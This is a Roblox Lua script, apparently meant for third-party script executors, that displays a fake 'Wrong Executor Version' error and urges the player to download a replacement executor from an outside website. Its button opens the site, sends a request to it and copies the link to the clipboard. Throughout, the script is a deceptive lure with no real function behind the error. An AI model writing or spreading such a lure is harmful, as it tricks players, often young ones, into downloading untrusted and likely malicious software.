pcall(function()
    -- Create the main GUI
    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Name = "HelloWorldPopup"
    ScreenGui.ResetOnSpawn = false
    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    ScreenGui.Parent = game:GetService("CoreGui") or game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
    
    -- Create the main frame (popup background)
    local MainFrame = Instance.new("Frame")
    MainFrame.Name = "MainFrame"
    MainFrame.Size = UDim2.new(0, 500, 0, 280)
    MainFrame.Position = UDim2.new(0.5, -250, 0.5, -140) -- Center of screen
    MainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    MainFrame.BorderSizePixel = 0
    MainFrame.Parent = ScreenGui
    
    -- Add corner radius for modern look
    local UICorner = Instance.new("UICorner")
    UICorner.CornerRadius = UDim.new(0, 12)
    UICorner.Parent = MainFrame
    
    -- Add shadow effect
    local UIStroke = Instance.new("UIStroke")
    UIStroke.Color = Color3.fromRGB(60, 60, 60)
    UIStroke.Thickness = 2
    UIStroke.Parent = MainFrame
    
    -- Create the title label
    local TitleLabel = Instance.new("TextLabel")
    TitleLabel.Name = "TitleLabel"
    TitleLabel.Size = UDim2.new(1, -40, 0, 120)
    TitleLabel.Position = UDim2.new(0, 20, 0, 20)
    TitleLabel.BackgroundTransparency = 1
    TitleLabel.Text = "Script Failed to execute. Error = Wrong Executor Version, Please go to https://robloxscripts.world/ to download the correct one"
    TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    TitleLabel.TextSize = 18
    TitleLabel.Font = Enum.Font.GothamBold
    TitleLabel.TextXAlignment = Enum.TextXAlignment.Center
    TitleLabel.TextYAlignment = Enum.TextYAlignment.Top
    TitleLabel.TextWrapped = true
    TitleLabel.Parent = MainFrame
    
    -- Create the button
    local RedirectButton = Instance.new("TextButton")
    RedirectButton.Name = "RedirectButton"
    RedirectButton.Size = UDim2.new(0, 300, 0, 50)
    RedirectButton.Position = UDim2.new(0.5, -150, 1, -80)
    RedirectButton.BackgroundColor3 = Color3.fromRGB(0, 162, 255)
    RedirectButton.Text = "Click here to redirect to Executors download page"
    RedirectButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    RedirectButton.TextSize = 16
    RedirectButton.Font = Enum.Font.Gotham
    RedirectButton.BorderSizePixel = 0
    RedirectButton.Parent = MainFrame
    
    -- Add corner radius to button
    local ButtonCorner = Instance.new("UICorner")
    ButtonCorner.CornerRadius = UDim.new(0, 8)
    ButtonCorner.Parent = RedirectButton
    
    -- Button hover effect
    RedirectButton.MouseEnter:Connect(function()
        RedirectButton.BackgroundColor3 = Color3.fromRGB(0, 140, 220)
    end)
    
    RedirectButton.MouseLeave:Connect(function()
        RedirectButton.BackgroundColor3 = Color3.fromRGB(0, 162, 255)
    end)
    
    -- Button click handler
    RedirectButton.MouseButton1Click:Connect(function()
        -- Try to open browser window (works in most executors)
        pcall(function()
            game:GetService("StarterGui"):SetCore("OpenBrowserWindow", "https://robloxscripts.world/")
        end)
        
        -- Alternative method for some executors
        pcall(function()
            game:GetService("HttpService"):GetAsync("https://robloxscripts.world/")
        end)
        
        -- Fallback: Copy link to clipboard
        pcall(function()
            setclipboard("https://robloxscripts.world/")
        end)
    end)
    
    -- Optional: Add a close button
    local CloseButton = Instance.new("TextButton")
    CloseButton.Name = "CloseButton"
    CloseButton.Size = UDim2.new(0, 30, 0, 30)
    CloseButton.Position = UDim2.new(1, -35, 0, 10)
    CloseButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
    CloseButton.Text = "X"
    CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    CloseButton.TextSize = 18
    CloseButton.Font = Enum.Font.GothamBold
    CloseButton.BorderSizePixel = 0
    CloseButton.Parent = MainFrame
    
    local CloseButtonCorner = Instance.new("UICorner")
    CloseButtonCorner.CornerRadius = UDim.new(0, 6)
    CloseButtonCorner.Parent = CloseButton
    
    CloseButton.MouseButton1Click:Connect(function()
        ScreenGui:Destroy()
    end)
end)
